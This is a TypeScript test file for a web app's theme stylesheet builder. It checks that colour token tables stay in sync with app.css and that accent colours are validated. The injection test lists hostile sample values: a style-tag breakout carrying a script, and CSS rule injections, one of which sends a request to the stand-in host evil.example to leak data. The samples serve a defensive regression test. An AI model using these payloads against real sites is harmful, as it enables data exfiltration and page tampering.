// @vitest-environment node
import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import {
  buildThemeStyle,
  LIGHT_TOKENS,
  DARK_TOKENS,
  HC_LIGHT_TOKENS,
  HC_DARK_TOKENS,
} from "$lib/appearance/theme-css";

const CSS = readFileSync(fileURLToPath(new URL("../../src/app.css", import.meta.url)), "utf8");

describe("the TS tables cannot drift from app.css", () => {
  // The palette exists twice on purpose: as CSS for `system` and the
  // logged-out routes, and as TS for the explicit choices. Neither
  // generates the other, so this is what stops them diverging — without
  // it, a user on `light` and a user on `system` with a light OS would
  // render different colours from the same deploy.
  it("declares the same key set for both schemes", () => {
    expect(Object.keys(LIGHT_TOKENS).sort()).toEqual(Object.keys(DARK_TOKENS).sort());
    expect(Object.keys(HC_LIGHT_TOKENS).sort()).toEqual(Object.keys(HC_DARK_TOKENS).sort());
  });

  it("emits dark values that match the @theme block", () => {
    for (const [token, value] of Object.entries(DARK_TOKENS)) {
      expect(CSS).toMatch(new RegExp(`${token}:\\s*${escapeRe(value)};`));
    }
  });

  it("emits light values that match the app.css light arm", () => {
    const arm = CSS.slice(CSS.indexOf("@media (prefers-color-scheme: light)"));
    for (const [token, value] of Object.entries(LIGHT_TOKENS)) {
      expect(arm).toMatch(new RegExp(`${token}:\\s*${escapeRe(value)};`));
    }
  });
});

describe("buildThemeStyle", () => {
  it("never emits a literal closing style tag from its own source", () => {
    const css = buildThemeStyle("dark", "#4f46e5");
    expect(css.startsWith("<style")).toBe(true);
    expect(css.endsWith("</style>")).toBe(true);
    expect(css.match(/<\/style>/g)).toHaveLength(1);
  });

  it("emits both arms behind media queries for system", () => {
    const css = buildThemeStyle("system", "#4f46e5");
    expect(css).toContain("@media (prefers-color-scheme: light)");
    expect(css).toContain("@media (prefers-color-scheme: dark)");
  });

  it("emits exactly one arm for an explicit choice", () => {
    expect(buildThemeStyle("light", "#4f46e5")).not.toContain("prefers-color-scheme");
    expect(buildThemeStyle("dark", "#4f46e5")).not.toContain("prefers-color-scheme");
  });

  it("uses :root:root so it outranks the unlayered contrast block", () => {
    expect(buildThemeStyle("light", "#4f46e5")).toContain(":root:root");
  });

  // CSP does not cover CSS injection. A value containing `</style>` breaks
  // out of the element, and a pure-CSS payload needs no tag break at all —
  // `#fff} body{background-image:url(https://evil.example/leak)} :root{`
  // produced a real outbound request under this app's img-src.
  it.each([
    "</style><script>alert(1)</script>",
    "#fff} body{display:none;} :root{",
    "#fff} body{background-image:url(https://evil.example/leak?t=x)} :root{",
    "#abc",
    "red",
  ])("refuses to interpolate a non-6-digit-hex accent: %s", (bad) => {
    const css = buildThemeStyle("dark", bad);
    expect(css).not.toContain(bad);
    expect(css.match(/<\/style>/g)).toHaveLength(1);
    // Pin the FALLBACK specifically, not just "some hex". The accent reaches
    // the output only through readableInk, which has its own guard, so
    // asserting a generic hex here would still pass with buildThemeStyle's
    // guard deleted — the injection surface is closed three times over and a
    // loose assertion cannot tell which layer closed it. #9792f0 is
    // readableInk(#4f46e5) on the dark backdrop, i.e. the ink derived from
    // FALLBACK_ACCENT. With the outer guard removed readableInk returns its
    // overlay (#ffffff) instead, so this line fails and the mutation dies.
    expect(css).toContain("--color-accent-ink: #9792f0;");
  });

  it("falls back rather than throwing on an empty accent", () => {
    expect(buildThemeStyle("dark", "")).toMatch(/--color-accent-ink: #[0-9a-f]{6};/);
  });

  it("derives a different ink per scheme from the same accent", () => {
    const css = buildThemeStyle("system", "#f59e0b");
    // Amber already clears 4.5:1 on the DARK backdrop (5.84:1), so the dark
    // arm echoes the accent unchanged — 3 of the 10 presets do. On light it
    // is 1.71:1 raw and must darken. The property under test is that the two
    // arms disagree, which is the whole reason the ink cannot stay inline on
    // the wrapper: one inline value cannot serve both schemes.
    expect(css).toContain("--color-accent-ink: #f59e0b;");
    expect(css).toContain("--color-accent-ink: #8c5d0e;");
  });
});

function escapeRe(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}
